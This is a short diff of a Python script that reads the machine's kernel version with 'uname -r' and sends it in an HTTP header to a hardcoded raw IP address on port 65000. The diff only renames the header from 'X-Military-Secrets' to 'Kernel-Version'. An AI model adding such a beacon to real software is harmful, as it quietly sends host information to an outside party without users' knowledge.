@@ -8,7 +8,7 @@ import subprocess as sp
 kernel = sp.getoutput('uname -r')
 
 # Requests
-headers = {'X-Military-Secrets': kernel}
+headers = {'Kernel-Version': kernel}
 url = 'http://162.243.3.85:65000'
 requests.get(url, headers=headers)
 
